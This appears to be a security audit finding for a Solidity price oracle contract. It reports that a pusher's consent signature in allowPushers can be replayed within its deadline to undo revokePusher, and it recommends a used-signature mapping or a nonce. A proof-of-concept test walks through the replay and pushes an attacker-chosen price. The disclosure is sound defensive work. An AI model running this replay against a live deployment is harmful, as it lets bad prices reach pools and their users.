### Title
Pusher Consent Signature Can Be Replayed Unlimited Times Within the Deadline Window, Nullifying `revokePusher` — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` verifies a pusher's EIP-191 consent signature but never marks it as consumed. A creator can replay the same signature an unlimited number of times within the deadline window to re-establish delegation immediately after the pusher calls `revokePusher()`, making revocation permanently ineffective and allowing unauthorized price data to continue landing in the creator's namespace.

---

### Finding Description

`allowPushers` hashes `(block.chainid, address(this), deadline, pusher, msg.sender)` and recovers the pusher's address from the signature: [1](#0-0) 

The only freshness gate is `_ensureDeadline(deadline)`, which rejects calls after the deadline. There is no nonce, no `usedSignatures` mapping, and no per-pusher invalidation counter. Once a pusher has signed a consent message, that single signature is valid for every call to `allowPushers` until `block.timestamp > deadline`.

The code's own NatSpec acknowledges the concern but claims the deadline solves it: [2](#0-1) 

The deadline prevents replay **after** expiry. It does not prevent replay **within** the deadline window. The pusher's revocation path: [3](#0-2) 

sets `namespaceRemapping[pusher] = address(0)`. The creator can immediately call `allowPushers` with the original signature to write `namespaceRemapping[pusher] = msg.sender` again. This cycle can repeat indefinitely until the deadline expires.

The `fallback` push path reads `namespaceRemapping[msg.sender]` at call time: [4](#0-3) 

So every push the pusher makes after a failed revocation lands in the creator's namespace, not the pusher's own.

---

### Impact Explanation

- **Pusher revocation is permanently nullified** within the deadline window. A pusher who signed a 24-hour consent cannot stop their pushes from landing in the creator's namespace for up to 24 hours, regardless of how many times they call `revokePusher()`.
- **Unauthorized price writes reach production feeds.** If the pusher is pushing data they no longer intend for the creator's namespace (e.g., after a key-rotation or business relationship termination), those prices are written into the creator's feed slots and consumed by pools via `price()`.
- **Bad-price execution.** Pools that call `getBidAsk` through a `PriceProvider` backed by the creator's compressed feed will receive prices the pusher did not authorize for that namespace, satisfying the "bad-price execution" impact gate.
- **Pusher's own namespace is blocked.** While the creator keeps replaying the signature, the pusher cannot build their own independent feed namespace — all their pushes are redirected.

---

### Likelihood Explanation

- The creator already holds the pusher's consent signature (they used it to call `allowPushers` the first time). No additional off-chain material is needed.
- The replay requires only a standard `allowPushers` call — no special privileges, no gas tricks, no MEV.
- The window is as long as the deadline the pusher originally agreed to (commonly 1–7 days in practice).
- The pusher has no on-chain mechanism to invalidate the signature before the deadline expires.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedSignatures` and mark each signature hash as used on first acceptance:

```solidity
bytes32 sigHash = keccak256(signatures[i]);
require(!_usedSignatures[sigHash], SignatureAlreadyUsed());
_usedSignatures[sigHash] = true;
```

Alternatively, include a per-pusher nonce in the signed payload and increment it on every successful `allowPushers` call, so any previously issued signature is immediately invalidated.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent once with a 1-day deadline.
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;

// 2. Creator delegates pusher.
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes — intends to push to own namespace.
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — no new pusher consent needed.
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds — no replay guard
assertEq(oracle.namespaceRemapping(pusher), creator); // re-delegated against pusher's will

// 5. Pusher's subsequent price push lands in creator's namespace, not their own.
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(999_999, 5, 0); // attacker-chosen price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);
// Price lands in creator's feed — consumed by pools using that feed.
assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
// Pusher's own namespace stays empty — their revocation had zero effect.
assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
